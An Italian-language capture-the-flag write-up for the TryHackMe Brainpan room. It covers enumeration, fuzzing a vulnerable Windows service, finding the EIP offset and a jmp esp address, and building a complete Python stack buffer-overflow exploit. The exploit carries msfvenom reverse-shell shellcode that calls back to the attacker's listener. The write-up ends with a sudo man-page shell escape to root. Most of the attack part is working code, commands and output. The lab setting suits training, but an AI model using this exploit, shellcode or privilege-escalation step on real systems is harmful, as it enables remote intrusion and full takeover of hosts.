#bufferoverflows 

https://tryhackme.com/room/brainpan

```
nmap -Pn -v -p- 10.10.218.209
```

```
PORT      STATE SERVICE
9999/tcp  open  abyss
10000/tcp open  snet-sensor-mgmt

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 34.88 seconds
           Raw packets sent: 65989 (2.904MB) | Rcvd: 65779 (2.631MB)

```

```
nmap -sVC -v -p9999,10000 10.10.218.209
```

```
9999/tcp  open  abyss?
| fingerprint-strings: 
|   NULL: 
|     _| _| 
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
|     _|_| _| _| _| _| _| _| _| _| _| _| _|
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
|     [________________________ WELCOME TO BRAINPAN _________________________]
|_    ENTER THE PASSWORD
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
| http-methods: 
|_  Supported Methods: HEAD
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: SimpleHTTP/0.6 Python/2.7.3
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.95%I=7%D=9/29%Time=68DA3E91%P=x86_64-pc-linux-gnu%r(NU
SF:LL,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\|
SF:\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\
SF:x20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\x
SF:20\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x
SF:20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x
SF:20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\|
SF:\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x
SF:20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x
SF:20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\x
SF:20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20_
SF:\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20\x
SF:20_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN\x
SF:20_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER\x
SF:20THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20>>\x20");

```

visitiamo
http://10.10.218.209:10000/
Troviamo una pagina con nulla di utile decidiamo di enumerarla

```
gobuster dir -u http://10.10.218.209:10000/ -w /usr/share/wordlists/dirb/common.txt -t50
```
```
Starting gobuster in directory enumeration mode
===============================================================
/bin                  (Status: 301) [Size: 0] [--> /bin/]
/index.html           (Status: 200) [Size: 215]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished

```
andiamo sulla directory trovata
http://10.10.218.209:10000/bin/
e troviamo un file da scaricare 
```
[brainpan.exe](http://10.10.218.209:10000/bin/brainpan.exe)
```

invece su 
http://10.10.218.209:9999/
troviamo 
```
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> 
                          ACCESS DENIED

```
è solo un intestazione proviamo a collegarci con netcat

```
nc 10.10.218.209 9999
```
```
[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> password123
                          ACCESS DENIED
                                          
```
qui abbiamo il servizio! 
Dovremmo vedere se vulnerabile a buffer overflow!

Ci scarichiamo brainpan.exe su Windows per analizzarlo con Immunity Debugger e controllare anche se corrisponde al servizio sulla porta 9999

Controlliamo IP che abbiamo su Windows
```
ipconfig
```
```
192.168.1.103
```

Avviamo Immunity Debugger e carichiamo brainpan.exe F9 per uscire  dalla pausa

Ora da Kali ci colleghiamo al nostro brainpan.exe locale
```
nc 192.168.1.103 9999
```

benissimo tutto funzionante , quindi possiamo testare se vulnerabile a BOF senza preoccuparci di mandare in crash l'applicazione

Iniziamo con l'immettere un input abbastanza lungo
```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

```
[get_reply] copied 234 bytes to buffer
[+] check is -1
[get_reply] s = [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
]
[get_reply] copied 234 bytes to buffer
```
Accesso negato ma ancora non crasha , aiutiamoci con uno script di fuzzing

```
nano fuz.py
```
```
#!/usr/bin/python3
import sys
import socket
from time import sleep

ip = "192.168.1.103"  # this my windows lab ip
port = 9999          # the application targeted port
buffer = 'A' * 50     # buffer

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.send((buffer + '\r\n').encode())  # encode to bytes for Python 3
        s.close()
        sleep(1)
        buffer = buffer + 'A' * 50

    except Exception:
        print("fuzzing crashed at %s bytes" % str(len(buffer)))  # Python 3 print
        sys.exit()
```
lo eseguiamo
```
python3 fuz.py
```
e dopo un poco otteniamo un crash dell'app
```
[get_reply] copied 552 bytes to buffer
```

```
EAX FFFFFFFF
ECX 3117303F ASCII "shitstorm
"
EDX 005FF700 ASCII "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
EBX 003F8000
ESP 005FF910 ASCII "AAAAAAAAAAAAAAAAAAAAAA
"
EBP 41414141
ESI 31171280 brainpan.<ModuleEntryPoint>
EDI 31171280 brainpan.<ModuleEntryPoint>
EIP 41414141

```

ora abbiamo la dimensione di overflow`552`

ora apriamo un'altro terminale in kali e visto che precedentemente abbiamo mandato in blocco tutto con 552 caratteri

per individuare l'offset preciso in cui il `EIP` puntatore all'istruzione estesa è stato sovrascritto,

creeremo un pattern univoco utilizzando il `Metasploit`modulo `pattern_create.rb`

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 552
```

```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3
```

ora immettiamo questo testo alla richiesta della chat di Immettere la Password
```
nc 192.168.1.103 9999
```

```
EAX FFFFFFFF
ECX 3117303F ASCII "shitstorm
"
EDX 005FF700 ASCII "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7
EBX 00252000
ESP 005FF910 ASCII "Ar6Ar7Ar8Ar9As0As1As2As3
"
EBP 72413372
ESI 31171280 brainpan.<ModuleEntryPoint>
EDI 31171280 brainpan.<ModuleEntryPoint>
EIP 35724134
```
- su **Immunity Debugger** abbiamo ottenuto un **Access violation** e il valore **EIP è 35724134**

ora utilizziamo lo script di offset del modello msf per trovare la lunghezza del carattere di cui abbiamo bisogno (la lunghezza esatta che manda in crash l'applicazione):

```
msf-pattern_offset -l 552 -q 35724134
```
```
┌──(kali㉿kali)-[~]
└─$ msf-pattern_offset -l 552 -q 35724134
[*] Exact match at offset 524
  
```

Ora dobbiamo costruire il nostro script Python che useremo per sfruttare il buffer overflows
- Modifichiamo l'offset a 524, il che renderà la variabile di overflow uguale a una stringa di 524 "A".  
- modifichiamo la variabile retn in "BBBB".  

 Reimpostiamo il programma brainpan.exe ed eseguiamo nuovamente lo script di exploit per verificare se abbiamo iniettato correttamente "BBBB" o 42424242 come indirizzo di ritorno EIP.

```
#!/usr/bin/python3
import sys
import socket
from time import sleep

ip = "192.168.1.103"  # this my windows lab ip
port = 9999          # the application targeted port

prefix = ""
offset = 524
overflow = "A" * offset
retn = "BBBB" # EIP (4 bytes)
badchars = ""
padding = ""
payload = ""
postfix = ""
buffer = prefix + overflow + retn + badchars + payload + postfix

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.send((buffer + '\r\n').encode())  # encode to bytes for Python 3
        s.close()
        sleep(1)
        buffer = buffer

    except Exception:
        print("fuzzing crashed at %s bytes" % str(len(buffer)))  # Python 3 print
        sys.exit()
```

```
python3 fuz.py
```

```
EAX FFFFFFFF
ECX 3117303F ASCII "shitstorm
"
EDX 005FF700 ASCII "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
EBX 002CE000
ESP 005FF910 ASCII "
"
EBP 41414141
ESI 31171280 brainpan.<ModuleEntryPoint>
EDI 31171280 brainpan.<ModuleEntryPoint>
EIP 42424242
```
perfetto! Abbiamo le nostre BBBB sul EIP


#cattivicaratteri 
Creiamo un array di byte escludendo \x00, che è il killer per eccellenza di caratteri errati/shellcode. Ci servirà successivamente nella creazione dello shellcode

Su questo sito https://github.com/cytopia/badchars
 Abbiamo un generatore di caratteri esadecimali errati per istruire i codificatori come **shikata-ga-nai** a trasformarli in altri caratteri.

Quindi ora aggiungiamo allo script
```
badchars = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18"
```
rieseguiamo il tutto controllando su **Immunity Debugger** se abbiamo le nostre A (41), poi le B (42) e infine i nostri caratteri errati al contrario

```
005FF904   41414141  AAAA
005FF908   41414141  AAAA
005FF90C   42424242  BBBB
005FF910   04030201  
005FF914   08070605  
005FF918   0C0B0A09  ...
005FF91C   100F0E0D  .
005FF920   14131211  
005FF924   18171615  
```

vediamo che da 01 a 09 tutto regolare dopo dal carattere 0a è sbagliato

ora se modifichiamo la stringa escludendolo 

 sembra che è tutto regolare non ci sono cattivi caratteri

Quindi ricapitolando quando creeremo il nostro payload con msfvenom dovremmo escludere solo questo cattivo carattere per eccellenza `\x00`

Per poter saltare al codice iniettato, dobbiamo trovare un'istruzione "jmp esp" che sia già utilizzata da questo programma. 

Per farlo, **utilizziamo mona**

`!mona jmp -r <register> -cpb <bad_characters>`  

```
!mona jmp -r esp -cpb "\x00"
```

Abbiamo trovato un puntatore che includono un'istruzione jmp esp e, cosa ancora migliore, non ha protezioni di memoria abilitate (DEP, ASLR, SafeSEH). 
```
Log data, item 3
 Address=311712F3
 Message=  0x311712f3 : jmp esp |  {PAGE_EXECUTE_READ} [brainpan.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Users\demo\Desktop\Test\brainpan.exe), 0x0

```

```
JMP ESP 0x311712F3
```
	indirizzo del puntatore

- - - - -
Se chiamiamo questa istruzione, possiamo inviare il programma ovunque punti ESP.  

Che dobbiamo trasformare in **Little Endian** che è il metodo in cui il valore è disposto dal byte meno significativo al byte più significativo:
quindi riscriviamo dal meno  byte significativo

Es: 0x311712F3 diviene
```
\xf3\x12\x17\x31
```
L'indirizzo jmp esp verrà utilizzato come variabile 'retn' nel nostro script, per essere iniettato nel registro EIP del programma di destinazione e, in definitiva, per indirizzare il programma allo shellcode che inietteremo nello stack.

Ora generiamo lo shellcode per una reverse shell usando **msfvenom**.

dovremmo escludere questo cattivo carattere `\x00`

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.14.99.134 LPORT=1234 -b "\x00" -f c -e x86/shikata_ga_nai
```

```
"\xd9\xce\xd9\x74\x24\xf4\x58\xbd\x28\x60\x27\x71\x31\xc9"
"\xb1\x52\x31\x68\x17\x03\x68\x17\x83\xc0\x9c\xc5\x84\xec"
"\xb5\x88\x67\x0c\x46\xed\xee\xe9\x77\x2d\x94\x7a\x27\x9d"
"\xde\x2e\xc4\x56\xb2\xda\x5f\x1a\x1b\xed\xe8\x91\x7d\xc0"
"\xe9\x8a\xbe\x43\x6a\xd1\x92\xa3\x53\x1a\xe7\xa2\x94\x47"
"\x0a\xf6\x4d\x03\xb9\xe6\xfa\x59\x02\x8d\xb1\x4c\x02\x72"
"\x01\x6e\x23\x25\x19\x29\xe3\xc4\xce\x41\xaa\xde\x13\x6f"
"\x64\x55\xe7\x1b\x77\xbf\x39\xe3\xd4\xfe\xf5\x16\x24\xc7"
"\x32\xc9\x53\x31\x41\x74\x64\x86\x3b\xa2\xe1\x1c\x9b\x21"
"\x51\xf8\x1d\xe5\x04\x8b\x12\x42\x42\xd3\x36\x55\x87\x68"
"\x42\xde\x26\xbe\xc2\xa4\x0c\x1a\x8e\x7f\x2c\x3b\x6a\xd1"
"\x51\x5b\xd5\x8e\xf7\x10\xf8\xdb\x85\x7b\x95\x28\xa4\x83"
"\x65\x27\xbf\xf0\x57\xe8\x6b\x9e\xdb\x61\xb2\x59\x1b\x58"
"\x02\xf5\xe2\x63\x73\xdc\x20\x37\x23\x76\x80\x38\xa8\x86"
"\x2d\xed\x7f\xd6\x81\x5e\xc0\x86\x61\x0f\xa8\xcc\x6d\x70"
"\xc8\xef\xa7\x19\x63\x0a\x20\x2c\x7a\x77\x36\x58\x80\x77"
"\x32\x4b\x0d\x91\x50\x7b\x58\x0a\xcd\xe2\xc1\xc0\x6c\xea"
"\xdf\xad\xaf\x60\xec\x52\x61\x81\x99\x40\x16\x61\xd4\x3a"
"\xb1\x7e\xc2\x52\x5d\xec\x89\xa2\x28\x0d\x06\xf5\x7d\xe3"
"\x5f\x93\x93\x5a\xf6\x81\x69\x3a\x31\x01\xb6\xff\xbc\x88"
"\x3b\xbb\x9a\x9a\x85\x44\xa7\xce\x59\x13\x71\xb8\x1f\xcd"
"\x33\x12\xf6\xa2\x9d\xf2\x8f\x88\x1d\x84\x8f\xc4\xeb\x68"
"\x21\xb1\xad\x97\x8e\x55\x3a\xe0\xf2\xc5\xc5\x3b\xb7\xf6"
"\x8f\x61\x9e\x9e\x49\xf0\xa2\xc2\x69\x2f\xe0\xfa\xe9\xc5"
"\x99\xf8\xf2\xac\x9c\x45\xb5\x5d\xed\xd6\x50\x61\x42\xd6"
"\x70";
```

Ora creiamo lo script finale

Abbiamo
```
offset = 524
```
	il nostro overflow
```
retn = "\xf3\x12\x17\x31"
```
	il puntatore all'istruzione jmp esp trovato in precedenza
```
padding = "\x90" * 16
```
	Il nostro codice potrebbe essere interrotto, l'aggiunta di una slitta NOP ne garantisce il funzionamento
``` 
shell ("\xd9\xce\xd9\x74\x24\xf4\x58\xbd\x28\x60\x27\x71\x31\xc9"......
```
	ed infine il nostro shellcode Msfvenom

```
nano bof.py
```
```
#!/usr/bin/env python3
import socket
import sys

# bad characters: \x00 \x0A
shell = (
b"\xd9\xce\xd9\x74\x24\xf4\x58\xbd\x28\x60\x27\x71\x31\xc9"
b"\xb1\x52\x31\x68\x17\x03\x68\x17\x83\xc0\x9c\xc5\x84\xec"
b"\xb5\x88\x67\x0c\x46\xed\xee\xe9\x77\x2d\x94\x7a\x27\x9d"
b"\xde\x2e\xc4\x56\xb2\xda\x5f\x1a\x1b\xed\xe8\x91\x7d\xc0"
b"\xe9\x8a\xbe\x43\x6a\xd1\x92\xa3\x53\x1a\xe7\xa2\x94\x47"
b"\x0a\xf6\x4d\x03\xb9\xe6\xfa\x59\x02\x8d\xb1\x4c\x02\x72"
b"\x01\x6e\x23\x25\x19\x29\xe3\xc4\xce\x41\xaa\xde\x13\x6f"
b"\x64\x55\xe7\x1b\x77\xbf\x39\xe3\xd4\xfe\xf5\x16\x24\xc7"
b"\x32\xc9\x53\x31\x41\x74\x64\x86\x3b\xa2\xe1\x1c\x9b\x21"
b"\x51\xf8\x1d\xe5\x04\x8b\x12\x42\x42\xd3\x36\x55\x87\x68"
b"\x42\xde\x26\xbe\xc2\xa4\x0c\x1a\x8e\x7f\x2c\x3b\x6a\xd1"
b"\x51\x5b\xd5\x8e\xf7\x10\xf8\xdb\x85\x7b\x95\x28\xa4\x83"
b"\x65\x27\xbf\xf0\x57\xe8\x6b\x9e\xdb\x61\xb2\x59\x1b\x58"
b"\x02\xf5\xe2\x63\x73\xdc\x20\x37\x23\x76\x80\x38\xa8\x86"
b"\x2d\xed\x7f\xd6\x81\x5e\xc0\x86\x61\x0f\xa8\xcc\x6d\x70"
b"\xc8\xef\xa7\x19\x63\x0a\x20\x2c\x7a\x77\x36\x58\x80\x77"
b"\x32\x4b\x0d\x91\x50\x7b\x58\x0a\xcd\xe2\xc1\xc0\x6c\xea"
b"\xdf\xad\xaf\x60\xec\x52\x61\x81\x99\x40\x16\x61\xd4\x3a"
b"\xb1\x7e\xc2\x52\x5d\xec\x89\xa2\x28\x0d\x06\xf5\x7d\xe3"
b"\x5f\x93\x93\x5a\xf6\x81\x69\x3a\x31\x01\xb6\xff\xbc\x88"
b"\x3b\xbb\x9a\x9a\x85\x44\xa7\xce\x59\x13\x71\xb8\x1f\xcd"
b"\x33\x12\xf6\xa2\x9d\xf2\x8f\x88\x1d\x84\x8f\xc4\xeb\x68"
b"\x21\xb1\xad\x97\x8e\x55\x3a\xe0\xf2\xc5\xc5\x3b\xb7\xf6"
b"\x8f\x61\x9e\x9e\x49\xf0\xa2\xc2\x69\x2f\xe0\xfa\xe9\xc5"
b"\x99\xf8\xf2\xac\x9c\x45\xb5\x5d\xed\xd6\x50\x61\x42\xd6"
b"\x70"
)

offset = 524
# JMP ESP little-endian
retn = b"\xf3\x12\x17\x31"  # 0x080416BF (usavi questa)
nop_sled = b"\x90" * 64

buffer = b"A" * offset + retn + nop_sled + shell

host = "10.10.218.209"
port = 9999

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    print("sending evil payload")
    s.sendall(buffer + b"\r\n")
    # Optional recv (may block) - comment out if not needed
    # data = s.recv(1024)
    print("Done!")
    s.close()
except Exception as e:
    print("error:", e)
    sys.exit(1)
```

Apriamo un altra finestra e ci mettiamo in ascolto sul nostro kali

```
nc -lvnp 1234
```

ed eseguiamo

```
python3 bof.py
```
 ed abbiamo la nostra revshell!

```
Z:\home\puck>whoami
File not found.


Z:\home\puck>ls
File not found.

Z:\home\puck>dir
Volume in drive Z has no label.
Volume Serial Number is 0000-0000

Directory of Z:\home\puck

  3/6/2013   3:23 PM  <DIR>         .
  3/4/2013  11:49 AM  <DIR>         ..
  3/6/2013   3:23 PM           513  checksrv.sh
  3/4/2013   2:45 PM  <DIR>         web
       1 file                       513 bytes
       3 directories     13,849,620,480 bytes free


Z:\home\puck>

```

Aspettiamo a cantar vittoria abbiamo i comandi molto limitati 
esaminiamo checksrv.sh che sa più di linux

```
type checksrv.sh
```

```
Z:\home\puck>type checksrv.sh
#!/bin/bash
# run brainpan.exe if it stops
lsof -i:9999
if [[ $? -eq 1 ]]; then 
        pid=`ps aux | grep brainpan.exe | grep -v grep`
        if [[ ! -z $pid ]]; then
                kill -9 $pid
                killall wineserver
                killall winedevice.exe
        fi
        /usr/bin/wine /home/puck/web/bin/brainpan.exe &
fi 

# run SimpleHTTPServer if it stops
lsof -i:10000
if [[ $? -eq 1 ]]; then 
        pid=`ps aux | grep SimpleHTTPServer | grep -v grep`
        if [[ ! -z $pid ]]; then
                kill -9 $pid
        fi
        cd /home/puck/web
        /usr/bin/python -m SimpleHTTPServer 10000
fi 

Z:\home\puck>

```

**Analisi del Codice**

**Monitoraggio di `brainpan.exe`**

1. **Controllo della Porta**: Utilizza `lsof -i:9999` per verificare se qualcosa sta ascoltando sulla porta 9999. Se non c'è nulla (exit status 1), procede.
2. **Recupero del PID**: Usa `ps aux` per cercare il processo `brainpan.exe`. Se trovato, lo termina con `kill -9`.
3. **Terminazione di Wine**: Chiama `killall` per terminare `wineserver` e `winedevice.exe`.
4. **Riavvio del Processo**: Riavvia `brainpan.exe` utilizzando Wine.

**Monitoraggio di `SimpleHTTPServer`**

1. **Controllo della Porta**: Utilizza `lsof -i:10000` per verificare se il server HTTP è attivo. Se non c'è nulla, procede.
2. **Recupero del PID**: Cerca il processo `SimpleHTTPServer` e lo termina se trovato.
3. **Avvio del Server**: Cambia directory in `/home/puck/web` e avvia `SimpleHTTPServer` sulla porta 10000.

Morale della favola l'applicazione è in esecuzione su Wine (emulatore Windows) ma come so è Linux

**Dobbiamo riscrivere il nostro payload per Linux**

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.14.45.85 LPORT=443
```

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.14.99.134 LPORT=1234 -b "\x00" -f c -e x86/shikata_ga_nai
```

```
"\xda\xc8\xd9\x74\x24\xf4\xba\x23\xc1\x6b\x75\x5e\x33\xc9"
"\xb1\x12\x31\x56\x17\x83\xc6\x04\x03\x75\xd2\x89\x80\x48"
"\x0f\xba\x88\xf9\xec\x16\x25\xff\x7b\x79\x09\x99\xb6\xfa"
"\xf9\x3c\xf9\xc4\x30\x3e\xb0\x43\x32\x56\x49\xba\xa7\x20"
"\x25\xc0\x27\x28\x64\x4d\xc6\x80\xee\x1e\x58\xb3\x5d\x9d"
"\xd3\xd2\x6f\x22\xb1\x7c\x1e\x0c\x45\x14\xb6\x7d\x86\x86"
"\x2f\x0b\x3b\x14\xe3\x82\x5d\x28\x08\x58\x1d"
```

```
nano bof.py
```
```
#!/usr/bin/env python3
import socket
import sys

# bad characters: \x00 \x0A
shell = (
b"\xda\xc8\xd9\x74\x24\xf4\xba\x23\xc1\x6b\x75\x5e\x33\xc9"
b"\xb1\x12\x31\x56\x17\x83\xc6\x04\x03\x75\xd2\x89\x80\x48"
b"\x0f\xba\x88\xf9\xec\x16\x25\xff\x7b\x79\x09\x99\xb6\xfa"
b"\xf9\x3c\xf9\xc4\x30\x3e\xb0\x43\x32\x56\x49\xba\xa7\x20"
b"\x25\xc0\x27\x28\x64\x4d\xc6\x80\xee\x1e\x58\xb3\x5d\x9d"
b"\xd3\xd2\x6f\x22\xb1\x7c\x1e\x0c\x45\x14\xb6\x7d\x86\x86"
b"\x2f\x0b\x3b\x14\xe3\x82\x5d\x28\x08\x58\x1d"
)

offset = 524
# JMP ESP little-endian
retn = b"\xf3\x12\x17\x31"  # 0x080416BF (usavi questa)
nop_sled = b"\x90" * 64

buffer = b"A" * offset + retn + nop_sled + shell

host = "10.10.218.209"
port = 9999

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    print("sending evil payload")
    s.sendall(buffer + b"\r\n")
    # Optional recv (may block) - comment out if not needed
    # data = s.recv(1024)
    print("Done!")
    s.close()
except Exception as e:
    print("error:", e)
    sys.exit(1)
```

Apriamo un altra finestra e ci mettiamo in ascolto sul nostro kali

```
nc -lvnp 1234
```

ed eseguiamo

```
python3 bof.py
```
 ed abbiamo la nostra revshell!

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234                                                                                             
listening on [any] 1234 ...
connect to [10.14.99.134] from (UNKNOWN) [10.10.218.209] 52256
whoami
puck
id  
uid=1002(puck) gid=1002(puck) groups=1002(puck)
ls
checksrv.sh
web

```

dopo qualche ricerca proviamo con
```
sudo -l
```

```
sudo -l
Matching Defaults entries for puck on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util

```

possiamo eseguire come root il comando
```
sudo /home/anansi/bin/anansi_util
```

```
sudo /home/anansi/bin/anansi_util
Usage: /home/anansi/bin/anansi_util [action]
Where [action] is one of:
  - network
  - proclist
  - manual [command]
```

Possiamo provare ad eseguire il manual con un comando per accedere ai files come root  od ottenere una shell di root

```
sudo /home/anansi/bin/anansi_util manual man
```

```
Usage: /home/anansi/bin/anansi_util [action]
Where [action] is one of:
  - network
  - proclist
  - manual [command]
sudo /home/anansi/bin/anansi_util manual
No manual entry for manual
```

dice non esiste una pagina del manuale

```
sudo /home/anansi/bin/anansi_util manual whoami
```

Ma qualcosa non va! Dopo essermi accorto che il manuale si chiudeva senza darmi la possibilità di immettere 
```
-  (press RETURN)!/bin/bash
```
ed averci sbattuto la testa per diversi minuti ho finalmente capito che dovevo stabilizzare la shell!
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

```
sudo /home/anansi/bin/anansi_util manual whoami
```

```
!/bin/bash
```
e finalmente root!
```
cd root
root@brainpan:~# ls
ls
b.txt
root@brainpan:~# cat b.txt
cat b.txt
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|


